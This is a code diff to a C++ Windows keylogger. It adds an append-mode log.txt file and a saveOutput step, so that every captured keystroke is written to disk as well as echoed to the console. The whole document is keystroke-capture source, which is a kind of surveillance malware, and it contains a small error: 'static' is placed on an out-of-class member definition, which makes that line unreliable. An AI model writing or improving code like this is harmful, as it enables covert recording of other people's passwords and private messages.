@@ -1,12 +1,9 @@
-#include <Windows.h>
-#include "keyboard.h"
 #include "keylogger.h"
 
-Keylogger::Keylogger(Keyboard* keyboard) : keyboard(keyboard), keylog(nullptr) {}
-
-bool Keylogger::isKeylogging() const {
-	return keylog != nullptr;
-}
+Keylogger::Keylogger(Keyboard* keyboard) 
+	: keyboard(keyboard)
+	, keylog(nullptr)
+	, outputFile("log.txt", std::fstream::app) {}
 
 void Keylogger::startKeylog() {
 	auto listener = [this]() {
@@ -17,10 +14,23 @@ void Keylogger::startKeylog() {
 		sleep(keyboard->polling);
 	};
 	keylog = new std::thread(listener);
+
+	//IF YOU REMOVE THIS COUT LINE, THE CODE WON'T WORK. 
+	std::cout << "STARTED KEYLOGGING" << std::endl;
+	//DON'T ASK ME WHY
+}
+void Keylogger::stopKeylog() {
+	std::thread* tempThread = keylog;
+	keylog = nullptr;
+	tempThread->join();
+	delete tempThread;
+}
+bool Keylogger::isKeylogging() {
+	return keylog != nullptr;
 }
 
 void Keylogger::setKeysState() {
-	for (BYTE i = 0; i < 255; i++) {
+	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
 		Key* curkey = keyboard->keys[i];
 
 		bool oldpressed = curkey->isPressed();
@@ -32,7 +42,6 @@ void Keylogger::setKeysState() {
 		}
 	}
 }
-
 void Keylogger::getOutput() {
 	Key** keys = keyboard->getKeys();
 	bool caps = keys[VK_CAPITAL]->isToggled();
@@ -40,9 +49,9 @@ void Keylogger::getOutput() {
 
 	bool upper = caps != shift;
 
-	for (BYTE i = 0; i < 255; i++) {
+	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
 		Key& key = *keys[i];
-		if (!key.isTriggered() || key.value == VK_SHIFT ||key.value == VK_CONTROL || key.value == VK_MENU) {
+		if (!key.isTriggered() || key.value == VK_SHIFT || key.value == VK_CONTROL || key.value == VK_MENU) {
 			continue;
 		}
 		if (key.value >= 'A' && key.value <= 'Z') {
@@ -79,19 +88,15 @@ void Keylogger::getOutput() {
 	}
 }
 
-void Keylogger::stopKeylog() {
-	std::thread* tempThread = keylog;
-	keylog = nullptr;
-	tempThread->join();
-	delete tempThread;
-}
-
-void Keylogger::handleOutput(char output) {
+template<typename T> void Keylogger::handleOutput(T output) {
 	showOutput(output);
+	saveOutput(output);
 }
-void Keylogger::handleOutput(std::string output) {
-	showOutput(output);
-}
-template<typename T> void Keylogger::showOutput(T output) {
+template<typename T> static void Keylogger::showOutput(T output) {
 	std::cout << output;
 }
+template<typename T> void Keylogger::saveOutput(T output) {
+	outputFile << output << std::flush;
+}
+
+
